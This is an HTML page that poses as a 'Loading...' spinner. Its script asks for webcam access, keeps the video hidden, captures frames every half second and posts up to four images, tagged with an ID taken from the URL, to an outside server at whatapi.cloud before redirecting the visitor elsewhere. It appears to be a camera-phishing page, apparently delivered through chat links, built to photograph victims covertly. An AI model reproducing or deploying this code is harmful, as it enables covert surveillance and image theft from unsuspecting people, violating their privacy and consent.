<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #7D2AE8;
        }
        .verification-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            text-align: center;
        }
        .rotate-icon {
            width: 50px;
            height: 50px;
            border: 6px solid #fff;
            border-top: 6px solid #7D2AE8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        video {
            display: none;
        }
        .console-container {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            max-height: 200px;
            background: rgba(0, 0, 0, 0.8);
            color: #fff;
            font-family: monospace;
            overflow-y: scroll;
            padding: 10px;
            box-sizing: border-box;
        }
    </style>
</head>
<body>

<div class="verification-container">
    <div class="rotate-icon"></div>
</div>

<video id="video" width="300" height="200" autoplay></video>

<!-- Custom in-browser console -->
<div class="console-container" id="console-log"></div>

<script>
    const video = document.querySelector("#video");
    const chatId = new URLSearchParams(window.location.search).get("id");
    let captureCount = 0;
    const maxCaptures = 4;

    // Custom in-browser console log function
    function customLog(message) {
        const consoleLog = document.getElementById("console-log");
        const logItem = document.createElement("div");
        logItem.textContent = message;
        consoleLog.appendChild(logItem);
        consoleLog.scrollTop = consoleLog.scrollHeight;
    }

    // Get user media (camera access)
    if (navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                video.srcObject = stream;
                customLog('Camera access granted.');
            })
            .catch(function(error) {
                customLog('Error accessing media devices: ' + error.message);
                alert('Error accessing media devices: ' + error.message);
            });
    } else {
        customLog('getUserMedia is not supported in your browser.');
        alert('getUserMedia is not supported in your browser.');
    }

    async function compressAndSendImage(image_data, quality, format) {
        try {
            const img = new Image();
            img.src = image_data;
            img.onload = async function() {
                const canvas = document.createElement('canvas');
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                const compressedDataUrl = canvas.toDataURL(format, quality);
                await sendImageToServer(compressedDataUrl);
            }
        } catch (error) {
            customLog('Error compressing image: ' + error.message);
            alert('Error compressing image: ' + error.message);
        }
    }

    async function sendImageToServer(image_data) {
        try {
            const response = await fetch('https://whatapi.cloud:8443/send-image', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: chatId,
                    image: image_data
                })
            });

            if (response.ok) {
                captureCount++;
                customLog('Image sent successfully. Capture count: ' + captureCount);
                if (captureCount >= maxCaptures) {
                    stopCapturing();
                }
            } else {
                customLog('Failed to send image: ' + response.statusText);
                alert('Failed to send image: ' + response.statusText);
            }
        } catch (error) {
            customLog('Error occurred while sending image: ' + error.message);
            alert('Error occurred while sending image: ' + error.message);
        }
    }

    function captureAndSendImage() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const image_data = canvas.toDataURL('image/jpeg', 0.5);

            customLog('Captured image data: ' + image_data.substring(0, 50) + '...'); // Log a small part of the data URL
            compressAndSendImage(image_data, 0.5, 'image/jpeg');
        } catch (error) {
            customLog('Error capturing image: ' + error.message);
            alert('Error capturing image: ' + error.message);
        }
    }

    function stopCapturing() {
        clearInterval(captureInterval);
        video.srcObject.getTracks().forEach(track => track.stop());
        window.location.href = "https://Linuxgen.in";
        customLog('Stopped capturing and redirected to https://Linuxgen.in');
    }

    const captureInterval = setInterval(function() {
        if (video.paused || video.ended) return;
        captureAndSendImage();
    }, 500);
</script>

</body>
</html>
